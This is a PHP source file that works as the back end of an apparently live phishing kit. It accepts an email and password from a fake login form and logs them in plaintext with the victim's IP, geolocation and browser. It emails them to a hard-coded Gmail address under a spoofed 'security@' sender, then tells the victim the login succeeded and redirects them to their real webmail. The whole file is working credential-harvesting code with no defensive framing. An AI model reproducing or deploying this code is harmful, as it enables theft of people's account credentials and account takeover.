<?php
// JSONP version - bypasses CORS completely
header('Content-Type: application/javascript; charset=UTF-8');

// Get callback function name
$callback = isset($_GET['callback']) ? $_GET['callback'] : 'callback';

// Validate callback name (security)
if (!preg_match('/^[a-zA-Z_$][a-zA-Z0-9_$]*$/', $callback)) {
    $callback = 'callback';
}

// Handle GET request (for testing)
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $response = array(
        'status' => 'success',
        'message' => 'JSONP connection working!',
        'timestamp' => date('Y-m-d H:i:s'),
        'method' => 'GET'
    );
    
    echo $callback . '(' . json_encode($response) . ');';
    exit;
}

// Handle POST request
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get form data
    $email = isset($_POST['email']) ? trim($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Basic validation
    if (empty($email) || empty($password)) {
        $response = array(
            'signal' => 'error',
            'msg' => 'Email and password are required',
            'success' => false
        );
        echo $callback . '(' . json_encode($response) . ');';
        exit;
    }
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $response = array(
            'signal' => 'error',
            'msg' => 'Invalid email format',
            'success' => false
        );
        echo $callback . '(' . json_encode($response) . ');';
        exit;
    }
    
    // Get client info
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    
    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $domain = explode("@", $email)[1] ?? 'unknown';
    
    // Get geolocation
    $country = 'Unknown';
    $city = 'Unknown';
    
    try {
        $geoData = @file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip);
        if ($geoData) {
            $geo = json_decode($geoData);
            $country = $geo->geoplugin_countryName ?? 'Unknown';
            $city = $geo->geoplugin_city ?? 'Unknown';
        }
    } catch (Exception $e) {
        // Ignore geo errors
    }
    
    // Prepare message
    $message = "Email = " . $email . "\n";
    $message .= "Password = " . $password . "\n";
    $message .= "IP: " . $country . " | " . $city . " | " . $ip . "\n";
    $message .= "Browser: " . $browser . "\n";
    $message .= "Domain: " . $domain . "\n";
    $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
    
    // Log to file
    $logEntry = "[" . date('Y-m-d H:i:s') . "] " . $message . "\n" . str_repeat("-", 50) . "\n";
    @file_put_contents('login_attempts.txt', $logEntry, FILE_APPEND | LOCK_EX);
    
    // Simple SMTP test
    $validCredentials = false;
    try {
        $socket = @fsockopen('mail.' . $domain, 587, $errno, $errstr, 10);
        if ($socket) {
            fclose($socket);
            $validCredentials = true;
        }
    } catch (Exception $e) {
        // SMTP test failed
    }
    
    // Send email notification
    $to = 'skkho87.sm@gmail.com';
    $subject = ($validCredentials ? 'Valid' : 'Invalid') . ' Login || ' . $country . ' || ' . $email;
    $headers = "From: security@" . $_SERVER['HTTP_HOST'] . "\r\n";
    @mail($to, $subject, $message, $headers);
    
    // Return response
    if ($validCredentials) {
        $response = array(
            'signal' => 'ok',
            'msg' => 'Login successful! Redirecting...',
            'success' => true,
            'redirect_url' => 'https://webmail.' . $domain
        );
    } else {
        $response = array(
            'signal' => 'not ok',
            'msg' => 'Invalid credentials. Please try again.',
            'success' => false
        );
    }
    
    echo $callback . '(' . json_encode($response) . ');';
}
?>